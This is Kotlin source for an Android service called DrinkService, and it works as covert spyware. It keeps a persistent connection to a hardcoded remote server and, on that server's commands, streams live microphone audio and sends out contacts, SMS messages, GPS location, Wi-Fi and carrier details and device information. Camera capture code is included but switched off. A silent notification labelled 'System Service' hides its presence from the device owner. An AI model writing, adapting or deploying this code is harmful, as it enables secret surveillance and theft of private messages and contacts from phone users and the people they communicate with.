package com.drink

import android.app.ActivityManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.CaptureResult
import android.hardware.camera2.TotalCaptureResult
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import kotlin.coroutines.resume
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.os.StatFs
import android.os.SystemClock
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.NetworkInterface
import java.util.Collections
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class DrinkService : Service() {

    companion object {
        const val ACTION_STATUS = "com.drink.STATUS"
        const val EXTRA_CONNECTED = "connected"
        const val ENABLE_CAMERA = false
        @Volatile var isConnected = false
        private const val HOST = "192.168.1.149"
        private const val PORT = 33110
        private const val CHANNEL_ID = "drink_channel"
        private const val NOTIF_ID = 1
        private const val SAMPLE_RATE = 16000
        private const val RECONNECT_DELAY = 15000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socketManager: SocketManager? = null
    private var micJob: Job? = null
    private val reconnectChannel = Channel<Unit>(Channel.CONFLATED)
    private var running = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "drink:lock").apply {
            runCatching { acquire() }
        }
        applyForegroundMode(0)

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (socketManager == null || !isConnected) {
                    triggerReconnect()
                }
            }
            override fun onLost(network: Network) {
                runCatching { socketManager?.close() }
            }
        }
        networkCallback = callback
        runCatching { cm.registerDefaultNetworkCallback(callback) }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { connectionLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        micJob?.cancel()
        reconnectChannel.close()
        socketManager?.close()
        runCatching {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback?.let { cm.unregisterNetworkCallback(it) }
        }
        scope.cancel()
        runCatching { wakeLock?.release() }
        super.onDestroy()
    }

    private fun triggerReconnect() {
        reconnectChannel.trySend(Unit)
    }

    private fun applyForegroundMode(extraType: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (extraType != 0 && (ENABLE_CAMERA || extraType != ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)) {
                type = type or extraType
            }
            runCatching {
                startForeground(NOTIF_ID, buildNotification(), type)
            }
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }
    }

    private suspend fun connectionLoop() {
        while (running) {
            try {
                val prefs = getSharedPreferences("drink_prefs", Context.MODE_PRIVATE)
                val host = prefs.getString("server_host", HOST) ?: HOST
                val port = prefs.getInt("server_port", PORT)
                val sm = SocketManager(host, port)
                socketManager = sm
                commandLoop(sm)
            } catch (e: Exception) {
                broadcastStatus(false)
            } finally {
                socketManager?.close()
                socketManager = null
                micJob?.cancel()
                micJob = null
                broadcastStatus(false)
            }
            if (running) {
                withTimeoutOrNull(RECONNECT_DELAY) {
                    reconnectChannel.receive()
                }
            }
        }
    }

    private fun sendCameraDisabled(sm: SocketManager) {
        runCatching {
            val err = JSONObject().apply {
                put("type", "error")
                put("cmd", "cams")
                put("message", "Camera feature is disabled")
            }
            sm.sendFrame(err)
        }
    }

    private fun handleStopMic() {
        micJob?.cancel()
        micJob = null
        applyForegroundMode(0)
    }

    private suspend fun commandLoop(sm: SocketManager) {
        try {
            while (running && sm.isConnected()) {
                val frame = sm.readFrame()
                if (!isConnected) {
                    broadcastStatus(true)
                }
                when (frame.optString("cmd")) {
                    "connected" -> {}
                    "use_mic" -> handleMic(sm)
                    "stop_mic" -> handleStopMic()
                    "get_contacts" -> handleContacts(sm)
                    "get_sms" -> handleSms(sm, frame)
                    "list_cams" -> if (ENABLE_CAMERA) handleListCams(sm) else sendCameraDisabled(sm)
                    "use_cam" -> if (ENABLE_CAMERA) handleUseCam(sm, frame) else sendCameraDisabled(sm)
                    "get_telemetry" -> handleTelemetry(sm)
                    "disconnect" -> {
                        sm.close()
                        return
                    }
                }
            }
        } finally {
            handleStopMic()
        }
    }

    private fun handleMic(sm: SocketManager) {
        micJob?.cancel()
        micJob = scope.launch {
            if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                runCatching {
                    val errorHeader = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "mic")
                        put("message", "Record audio permission not granted")
                    }
                    sm.sendFrame(errorHeader)
                }
                return@launch
            }
            applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            val minBuf = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )
            val actualBufferSize = if (minBuf > 0) maxOf(minBuf * 2, 4096) else 4096

            var recorder: AudioRecord? = null
            val audioSources = intArrayOf(
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.DEFAULT,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION
            )
            for (source in audioSources) {
                try {
                    val rec = AudioRecord(
                        source,
                        SAMPLE_RATE,
                        AudioFormat.CHANNEL_IN_MONO,
                        AudioFormat.ENCODING_PCM_16BIT,
                        actualBufferSize
                    )
                    if (rec.state == AudioRecord.STATE_INITIALIZED) {
                        recorder = rec
                        break
                    } else {
                        rec.release()
                    }
                } catch (e: Exception) {
                }
            }

            if (recorder == null || recorder.state != AudioRecord.STATE_INITIALIZED) {
                recorder?.release()
                if (sm.isConnected() && isActive) {
                    runCatching {
                        val errorHeader = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "mic")
                            put("message", "AudioRecord initialization failed")
                        }
                        sm.sendFrame(errorHeader)
                    }
                }
                return@launch
            }

            try {
                recorder.startRecording()
                if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
                    throw IllegalStateException("AudioRecord failed to start recording")
                }
                val buffer = ByteArray(actualBufferSize)
                while (isActive && sm.isConnected()) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val chunk = buffer.copyOf(read)
                        val header = JSONObject().apply {
                            put("type", "mic_chunk")
                            put("size", chunk.size)
                        }
                        sm.sendFrame(header, chunk)
                    } else if (read < 0) {
                        if (sm.isConnected() && isActive) {
                            runCatching {
                                val errorHeader = JSONObject().apply {
                                    put("type", "error")
                                    put("cmd", "mic")
                                    put("message", "AudioRecord read error code: $read")
                                }
                                sm.sendFrame(errorHeader)
                            }
                        }
                        break
                    }
                }
            } catch (e: Exception) {
                if (sm.isConnected() && isActive) {
                    runCatching {
                        val errorHeader = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "mic")
                            put("message", e.message ?: "Mic stream failed")
                        }
                        sm.sendFrame(errorHeader)
                    }
                }
            } finally {
                runCatching {
                    recorder.stop()
                    recorder.release()
                }
                applyForegroundMode(0)
            }
        }
    }

    private suspend fun handleContacts(sm: SocketManager) = withContext(Dispatchers.IO) {
        try {
            val contacts = readContacts()
            val zipBytes = buildContactsZip(contacts)
            val header = JSONObject().apply {
                put("type", "contacts")
                put("size", zipBytes.size)
            }
            sm.sendFrame(header, zipBytes)
        } catch (e: Exception) {
            runCatching {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "contacts")
                    put("message", e.message ?: "Failed to get contacts")
                }
                sm.sendFrame(errorHeader)
            }
        }
    }

    private fun readContacts(): List<Map<String, String>> {
        val result = mutableListOf<Map<String, String>>()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                ),
                null, null, null
            ) ?: return result
            cursor.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) ?: "" else ""
                    val phone = if (phoneIdx != -1) it.getString(phoneIdx) ?: "" else ""
                    result.add(mapOf(
                        "name" to name,
                        "phone" to phone,
                    ))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun buildContactsZip(contacts: List<Map<String, String>>): ByteArray {
        val baos = ByteArrayOutputStream()
        ZipOutputStream(baos).use { zip ->
            zip.putNextEntry(ZipEntry("contacts.json"))
            val arr = JSONArray()
            contacts.forEach { c ->
                val obj = JSONObject()
                obj.put("name", c["name"] ?: "")
                obj.put("phone", c["phone"] ?: "")
                arr.put(obj)
            }
            zip.write(arr.toString().toByteArray(Charsets.UTF_8))
            zip.closeEntry()
        }
        return baos.toByteArray()
    }

    private suspend fun handleSms(sm: SocketManager, frame: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val hours = frame.optInt("hours", 24)
            val messages = readSms(hours)
            val response = JSONObject().apply {
                put("type", "sms")
                put("hours", hours)
                put("data", messages)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            runCatching {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "sms")
                    put("message", e.message ?: "Failed to read SMS")
                }
                sm.sendFrame(errorHeader)
            }
        }
    }

    private fun readSms(hours: Int): JSONArray {
        val result = JSONArray()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val since = System.currentTimeMillis() - hours.toLong() * 60 * 60 * 1000L
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                ),
                "${Telephony.Sms.DATE} > ?",
                arrayOf(since.toString()),
                "${Telephony.Sms.DATE} DESC"
            ) ?: return result
            cursor.use {
                val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
                while (it.moveToNext()) {
                    result.put(JSONObject().apply {
                        put("address", if (addrIdx != -1) it.getString(addrIdx) ?: "" else "")
                        put("body", if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else "")
                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                        put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
                    })
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun handleListCams(sm: SocketManager) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraIds = cameraManager.cameraIdList
            val arr = JSONArray()
            for (id in cameraIds) {
                arr.put(id)
            }
            val response = JSONObject().apply {
                put("type", "cams")
                put("data", arr)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            val errorHeader = JSONObject().apply {
                put("type", "error")
                put("cmd", "cams")
                put("message", e.message ?: "Failed to list cameras")
            }
            sm.sendFrame(errorHeader)
        }
    }

    private fun handleUseCam(sm: SocketManager, frame: JSONObject) {
        val camId = frame.optString("cam_id", "0")
        scope.launch(Dispatchers.IO) {
            captureCamera(sm, camId)
        }
    }

    private fun captureCamera(sm: SocketManager, camId: String) {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val err = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "camera_capture")
                    put("message", "Camera permission not granted")
                }
                sm.sendFrame(err)
                return
            }
            applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)

            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val characteristics = cameraManager.getCameraCharacteristics(camId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = jpegSizes?.filter { it.width.toLong() * it.height <= 4096 * 3072 }?.maxByOrNull { it.width.toLong() * it.height }
                ?: jpegSizes?.maxByOrNull { it.width.toLong() * it.height }
                ?: jpegSizes?.firstOrNull()
            val width = targetSize?.width ?: 1920
            val height = targetSize?.height ?: 1080

            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            val thread = HandlerThread("CameraCaptureThread").apply { start() }
            val handler = Handler(thread.looper)

            var cameraDevice: CameraDevice? = null
            var session: CameraCaptureSession? = null
            var framesReceived = 0
            var captured = false
            var aeConverged = false

            val cleanup = {
                runCatching { session?.stopRepeating() }
                runCatching { session?.close() }
                runCatching { cameraDevice?.close() }
                runCatching { imageReader.close() }
                runCatching { thread.quitSafely() }
                applyForegroundMode(0)
            }

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                framesReceived++
                if (!aeConverged && framesReceived < 12 && !captured) {
                    image.close()
                    return@setOnImageAvailableListener
                }
                if (!captured) {
                    captured = true
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        val header = JSONObject().apply {
                            put("type", "camera_capture")
                            put("cam_id", camId)
                            put("size", bytes.size)
                        }
                        sm.sendFrame(header, bytes)
                    } catch (e: Exception) {
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "camera_capture")
                            put("message", e.message ?: "Failed to process photo")
                        }
                        sm.sendFrame(err)
                    } finally {
                        image.close()
                        cleanup()
                    }
                } else {
                    image.close()
                }
            }, handler)

            cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val targets = listOf(surface)
                        camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(captureSession: CameraCaptureSession) {
                                session = captureSession
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AE_ANTIBANDING_MODE, CaptureRequest.CONTROL_AE_ANTIBANDING_MODE_AUTO)
                                        set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                        set(CaptureRequest.JPEG_QUALITY, 100.toByte())

                                        val aeRange = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
                                        if (aeRange != null && aeRange.upper > 0) {
                                            val compensation = (aeRange.upper * 0.35).toInt().coerceIn(1, aeRange.upper)
                                            set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, compensation)
                                        }

                                        val sceneModes = characteristics.get(CameraCharacteristics.CONTROL_AVAILABLE_SCENE_MODES)
                                        if (sceneModes != null && sceneModes.contains(CameraCharacteristics.CONTROL_SCENE_MODE_HDR)) {
                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_USE_SCENE_MODE)
                                            set(CaptureRequest.CONTROL_SCENE_MODE, CameraCharacteristics.CONTROL_SCENE_MODE_HDR)
                                        }

                                        set(CaptureRequest.EDGE_MODE, CaptureRequest.EDGE_MODE_HIGH_QUALITY)
                                        set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
                                        set(CaptureRequest.COLOR_CORRECTION_MODE, CaptureRequest.COLOR_CORRECTION_MODE_HIGH_QUALITY)
                                        set(CaptureRequest.HOT_PIXEL_MODE, CaptureRequest.HOT_PIXEL_MODE_HIGH_QUALITY)
                                    }
                                    val captureCallback = object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(
                                            session: CameraCaptureSession,
                                            request: CaptureRequest,
                                            result: TotalCaptureResult
                                        ) {
                                            val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
                                            if (aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
                                                aeState == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED ||
                                                aeState == CaptureResult.CONTROL_AE_STATE_LOCKED
                                            ) {
                                                aeConverged = true
                                            }
                                        }
                                    }
                                    captureSession.setRepeatingRequest(requestBuilder.build(), captureCallback, handler)
                                    handler.postDelayed({
                                        aeConverged = true
                                    }, 2200)
                                } catch (e: Exception) {
                                    cleanup()
                                    val err = JSONObject().apply {
                                        put("type", "error")
                                        put("cmd", "camera_capture")
                                        put("message", e.message ?: "Failed capture")
                                    }
                                    sm.sendFrame(err)
                                }
                            }

                            override fun onConfigureFailed(captureSession: CameraCaptureSession) {
                                cleanup()
                                val err = JSONObject().apply {
                                    put("type", "error")
                                    put("cmd", "camera_capture")
                                    put("message", "Camera session config failed")
                                }
                                sm.sendFrame(err)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        cleanup()
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "camera_capture")
                            put("message", e.message ?: "Failed to create session")
                        }
                        sm.sendFrame(err)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    cleanup()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    cleanup()
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "camera_capture")
                        put("message", "Camera error $error")
                    }
                    sm.sendFrame(err)
                }
            }, handler)
        } catch (e: Exception) {
            val err = JSONObject().apply {
                put("type", "error")
                put("cmd", "camera_capture")
                put("message", e.message ?: "Failed to open camera")
            }
            sm.sendFrame(err)
        }
    }

    private suspend fun acquireLocation(): Location? {
        if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return null

        var bestLoc: Location? = null
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        for (p in providers) {
            runCatching {
                val l = lm.getLastKnownLocation(p) ?: return@runCatching
                if (bestLoc == null || l.time > (bestLoc?.time ?: 0L)) {
                    bestLoc = l
                }
            }
        }

        if (bestLoc != null && (System.currentTimeMillis() - bestLoc!!.time) < 120000L) {
            return bestLoc
        }

        val targetProvider = when {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
            else -> providers.firstOrNull { lm.isProviderEnabled(it) }
        } ?: return bestLoc

        return try {
            withTimeoutOrNull(4000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    val listener = object : LocationListener {
                        override fun onLocationChanged(location: Location) {
                            runCatching { lm.removeUpdates(this) }
                            if (cont.isActive) cont.resume(location)
                        }
                        override fun onProviderDisabled(provider: String) {}
                        override fun onProviderEnabled(provider: String) {}
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    }
                    cont.invokeOnCancellation {
                        runCatching { lm.removeUpdates(listener) }
                    }
                    try {
                        lm.requestSingleUpdate(targetProvider, listener, Looper.getMainLooper())
                    } catch (e: Exception) {
                        try {
                            lm.requestLocationUpdates(targetProvider, 0L, 0f, listener, Looper.getMainLooper())
                        } catch (e2: Exception) {
                            if (cont.isActive) cont.resume(bestLoc)
                        }
                    }
                }
            } ?: bestLoc
        } catch (e: Exception) {
            bestLoc
        }
    }

    private fun handleTelemetry(sm: SocketManager) {
        scope.launch(Dispatchers.IO) {
            try {
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val bLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val bScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val bPct = if (bLevel >= 0 && bScale > 0) (bLevel * 100) / bScale else -1
                val bStatus = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
                val isCharging = bStatus == BatteryManager.BATTERY_STATUS_CHARGING || bStatus == BatteryManager.BATTERY_STATUS_FULL
                val bPlugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val pluggedStr = when (bPlugged) {
                    BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                    BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                    BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                    else -> if (isCharging) "Charging" else "Unplugged"
                }
                val bTemp = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
                val bVolt = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0) / 1000.0
                val bHealthInt = batteryIntent?.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN) ?: BatteryManager.BATTERY_HEALTH_UNKNOWN
                val bHealth = when (bHealthInt) {
                    BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
                    BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
                    BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
                    BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
                    else -> "Normal"
                }

                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val activeNet = cm.activeNetwork
                val caps = if (activeNet != null) cm.getNetworkCapabilities(activeNet) else null
                val netType = when {
                    caps == null -> "Disconnected"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
                    else -> "Other"
                }
                var wifiSsid = ""
                runCatching {
                    val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    if (info != null && info.ssid != null && info.ssid != "<unknown ssid>") {
                        wifiSsid = info.ssid.trim('"')
                    }
                }
                var localIp = ""
                runCatching {
                    val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
                    for (nif in interfaces) {
                        val addrs = Collections.list(nif.inetAddresses)
                        for (addr in addrs) {
                            if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                                localIp = addr.hostAddress ?: ""
                                break
                            }
                        }
                        if (localIp.isNotEmpty()) break
                    }
                }
                var carrier = ""
                runCatching {
                    val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    carrier = tm.networkOperatorName.ifEmpty { tm.simOperatorName }
                }

                val stat = StatFs(Environment.getDataDirectory().path)
                val totalStorage = stat.totalBytes
                val freeStorage = stat.availableBytes
                val usedStorage = totalStorage - freeStorage

                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val memInfo = ActivityManager.MemoryInfo()
                am.getMemoryInfo(memInfo)
                val totalRam = memInfo.totalMem
                val freeRam = memInfo.availMem
                val usedRam = totalRam - freeRam
                val isLowRam = memInfo.lowMemory

                val manufacturer = Build.MANUFACTURER
                val model = Build.MODEL
                val brand = Build.BRAND
                val androidVersion = Build.VERSION.RELEASE
                val sdkInt = Build.VERSION.SDK_INT
                val securityPatch = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "N/A"
                val uptimeSeconds = SystemClock.elapsedRealtime() / 1000

                val hasLocationPerm = ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                val loc = if (hasLocationPerm) acquireLocation() else null

                val locObj = JSONObject()
                if (!hasLocationPerm) {
                    locObj.put("status", "permission_denied")
                } else if (loc != null) {
                    locObj.put("status", "available")
                    locObj.put("latitude", loc.latitude)
                    locObj.put("longitude", loc.longitude)
                    locObj.put("accuracy", loc.accuracy.toDouble())
                    locObj.put("altitude", loc.altitude)
                    locObj.put("timestamp", loc.time)
                } else {
                    locObj.put("status", "unavailable")
                }

                val resp = JSONObject().apply {
                    put("type", "telemetry")
                    put("battery", JSONObject().apply {
                        put("level", bPct)
                        put("charging", isCharging)
                        put("plugged", pluggedStr)
                        put("temperature", bTemp)
                        put("voltage", bVolt)
                        put("health", bHealth)
                    })
                    put("network", JSONObject().apply {
                        put("type", netType)
                        put("ssid", wifiSsid)
                        put("ip", localIp)
                        put("carrier", carrier)
                    })
                    put("storage", JSONObject().apply {
                        put("total_bytes", totalStorage)
                        put("used_bytes", usedStorage)
                        put("free_bytes", freeStorage)
                    })
                    put("memory", JSONObject().apply {
                        put("total_bytes", totalRam)
                        put("used_bytes", usedRam)
                        put("free_bytes", freeRam)
                        put("low_memory", isLowRam)
                    })
                    put("device", JSONObject().apply {
                        put("manufacturer", manufacturer)
                        put("model", model)
                        put("brand", brand)
                        put("android_version", androidVersion)
                        put("sdk", sdkInt)
                        put("security_patch", securityPatch)
                        put("uptime_seconds", uptimeSeconds)
                    })
                    put("location", locObj)
                }
                sm.sendFrame(resp)
            } catch (e: Exception) {
                runCatching {
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "telemetry")
                        put("message", e.message ?: "Failed to get telemetry")
                    }
                    sm.sendFrame(err)
                }
            }
        }
    }

    private fun broadcastStatus(connected: Boolean) {
        isConnected = connected
        val intent = Intent(ACTION_STATUS).apply {
            putExtra(EXTRA_CONNECTED, connected)
        }
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Service",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .setSilent(true)
        .setOngoing(true)
        .build()
}
